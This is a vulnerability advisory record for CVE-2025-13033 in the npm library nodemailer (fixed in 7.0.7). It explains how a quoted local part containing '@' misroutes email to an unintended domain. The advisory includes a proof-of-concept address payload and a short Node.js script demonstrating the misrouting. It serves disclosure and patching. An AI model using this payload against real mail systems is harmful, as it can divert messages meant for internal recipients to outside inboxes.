advisory_id: npm/nodemailer/CVE-2025-13033
datasource_id: gitlab_importer_v2/npm/nodemailer/CVE-2025-13033
datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/npm/nodemailer/CVE-2025-13033.yml
aliases:
  - CVE-2025-13033
  - GHSA-mm7p-fcc7-pg87
summary: |
  Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict
  The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.

  Payload: `"xclow3n@gmail.com x"@internal.domain`
  Using the following code to send mail
  ```
  const nodemailer = require("nodemailer");

  let transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
  user: "",
  pass: "",
  },
  });

  let mailOptions = {
  from: '"Test Sender" <your_email@gmail.com>',
  to: "\"xclow3n@gmail.com x\"@internal.domain",
  subject: "Hello from Nodemailer",
  text: "This is a test email sent using Gmail SMTP and Nodemailer!",
  };

  transporter.sendMail(mailOptions, (error, info) => {
  if (error) {
  return console.log("Error: ", error);
  }
  console.log("Message sent: %s", info.messageId);

  });


  (async () => {
  const parser = await import("@sparser/email-address-parser");
  const { EmailAddress, ParsingOptions } = parser.default;
  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);

  if (!parsed) {
  console.error("Invalid email address:", mailOptions.to);
  return;
  }

  console.log("Parsed email:", {
  address: `${parsed.localPart}@${parsed.domain}`,
  local: parsed.localPart,
  domain: parsed.domain,
  });
  })();
  ```

  Running the script and seeing how this mail is parsed according to RFC

  ```
  Parsed email: {
  address: '"xclow3n@gmail.com x"@internal.domain',
  local: '"xclow3n@gmail.com x"',
  domain: 'internal.domain'
  }
  ```

  But the email is sent to `xclow3n@gmail.com`

  <img width="2128" height="439" alt="Image" src="https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d" />
impacted_packages:
  - purl: pkg:npm/nodemailer
    affected_versions: vers:npm/<7.0.7
    fixed_versions: vers:npm/7.0.7
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score:
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/npm/nodemailer/CVE-2025-13033.yml
weaknesses:
  - CWE-937
  - CWE-20
  - CWE-1035
  - CWE-436
references:
  - url: https://access.redhat.com/security/cve/CVE-2025-13033
    reference_type:
    reference_id:
  - url: https://bugzilla.redhat.com/show_bug.cgi?id=2402179
    reference_type:
    reference_id:
  - url: https://github.com/nodemailer/nodemailer
    reference_type:
    reference_id:
  - url: https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626
    reference_type:
    reference_id:
  - url: https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-13033
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-mm7p-fcc7-pg87
    reference_type:
    reference_id: GHSA-mm7p-fcc7-pg87
